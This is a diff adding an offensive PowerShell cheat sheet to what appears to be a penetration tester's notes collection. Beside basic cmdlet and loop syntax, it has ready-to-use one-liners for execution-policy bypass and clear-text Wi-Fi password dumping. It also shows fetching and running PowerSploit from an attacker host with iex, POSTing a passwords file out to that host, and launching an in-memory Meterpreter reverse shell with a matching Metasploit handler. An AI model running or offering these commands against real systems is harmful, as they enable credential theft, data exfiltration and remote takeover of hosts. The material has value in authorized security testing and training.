@@ -1,0 +1,177 @@
+PowerShell
+
+
+# Overview
+
+PowerShell 3 quick reference: cmdlets, execution policy, remote load (iwr/iex), and in-memory execution. Searchable one-liners use padded descriptions. Domain enumeration lives in powerview.txt.
+
+
+# Related Notes
+
+powerview.txt            PowerView function index and AD recipes
+ps-attack.txt            PSAttack GUI workflow
+active-directory.txt     On-domain dsquery and Get-Net* enumeration
+windows-privesc.txt      PowerUp, PrivescCheck, and AMSI context
+windows-lateral.txt      Remote execution after creds
+windows-credentials.txt  Mimikatz and hash dumping
+metasploit.txt           Handler and payload delivery
+
+
+# Contents
+
+Quick Reference, Launch and Execution Policy, Help and Cmdlets, Loops and Objects,
+Wi-Fi Passwords, Remote Load, Invoke-Shellcode, Validation / False Positives
+
+
+# Quick Reference
+
+$host.Version                                          Show PowerShell version
+powershell -nop -exec bypass                           Start PS and bypass execution policy
+Get-ExecutionPolicy -List                              Show execution policy scopes
+Set-ExecutionPolicy Bypass -Scope Process              Bypass policy for current session
+Get-Command                                            Show all commands
+Get-Verb                                               Show approved verbs
+Get-Help <cmdlet>                                      Get help on a cmdlet
+help Import-Module -Examples                           Show examples for a cmdlet
+Get-History                                            Show command history
+Get-Process                                            Show running processes
+Get-Alias                                              Show all aliases
+
+
+# Launch and Execution Policy
+
+## Overview
+
+Bypass execution policy for the current process when loading scripts from disk or memory.
+
+## Commands
+
+From cmd.exe:
+    powershell -nop -exec bypass
+
+File types:
+    .ps1   script
+    .psd1  script data
+    .psm1  script module
+
+    Get-ExecutionPolicy -List
+    Set-ExecutionPolicy Bypass -Scope Process
+
+
+# Help and Cmdlets
+
+## Overview
+
+Every cmdlet uses verb-noun naming. Tab-complete after the verb prefix.
+
+## Commands
+
+Get-Command                                            Show all commands
+Get-Verb                                               Show all verbs
+Get-ChildItem -Recurse                                 List cwd and all subdirectories
+Get-ChildItem -Path C:\Users\<user>\Downloads -Recurse
+Start-Process .\notepad.exe                            Start a process
+Stop-Process -Name notepad                             Stop a process by name
+Get-Process | Select-Object ProcessName, Id            Show process names and PIDs
+Get-Process -IncludeUserName | ft Username, ProcessName | findstr <user>
+
+Get-Alias                                              Show all aliases
+New-Alias -Name "Show-Files" Get-ChildItem             Create an alias
+Get-Alias -Name "Show-Files"                           Show alias details
+
+Get-Help <cmdlet>                                      Get help on a cmdlet
+help Import-Module -Examples                           Show import examples
+
+
+# Loops and Objects
+
+## Overview
+
+Minimal syntax reference for quick scripts on target.
+
+## Commands
+
+    $a = "apple"
+    $a.Length
+    $a.ToUpper()
+
+    $list = "red", "white", "blue"
+    $list[0]
+
+    foreach ($item in $list) {
+        Write-Host $item
+    }
+
+    $i = 1
+    while ($i -le 5) {
+        Write-Host $i
+        $i = $i + 1
+    }
+
+
+# Wi-Fi Passwords
+
+## Overview
+
+Extract saved wireless profile passwords on a Windows host (authorized assessments only).
+
+## Commands
+
+    (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
+
+
+# Remote Load
+
+## Overview
+
+Host scripts from the attack machine and load into target PowerShell without writing to disk (or save locally first).
+
+Attack host:
+    cd /opt/PowerSploit/Recon/
+    python3 -m http.server 80
+
+Download to disk, then import:
+    powershell -nop -exec bypass
+    iwr -UseBasicParsing http://<attacker IP>/PowerView.ps1 -OutFile .\PowerView.ps1
+    Import-Module .\PowerView.ps1
+    Get-NetLocalGroup
+
+Execute in memory:
+    powershell -nop -exec bypass
+    iex (iwr -UseBasicParsing http://<attacker IP>/PowerView.ps1); Get-NetLocalGroup
+
+Upload data via HTTP POST:
+    powershell -nop -exec bypass
+    iex "(New-Object Net.WebClient).UploadString('http://<attacker IP>/passwords.txt','<PostDATA>')"
+
+
+# Invoke-Shellcode
+
+## Overview
+
+In-memory Meterpreter via PowerSploit Invoke-Shellcode. Verify payload and handler settings before relying on this in a lab.
+
+## Commands
+
+Handler (msfconsole):
+    use exploit/multi/handler
+    set payload windows/meterpreter/reverse_https
+    set lhost <attacker IP>
+    set lport 443
+    exploit -j
+
+Attack host:
+    cd /opt/PowerSploit/CodeExecution/
+    python3 -m http.server 80
+
+Target:
+    powershell -nop -exec bypass
+    IEX "(New-Object Net.WebClient).DownloadString('http://<attacker IP>/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost <attacker IP> -Lport 443 -Force"
+
+
+# Validation / False Positives
+
+iwr without -UseBasicParsing can fail on Windows Server Core or older hosts; add the flag for compatibility.
+AMSI may block iex of known PowerSploit signatures; see windows-privesc.txt for bypass options before loading.
+Invoke-Shellcode requires matching handler payload/arch; silent failure often means wrong LHOST/LPORT or blocked egress.
+Get-Process -IncludeUserName needs elevation to show other users' process owners.
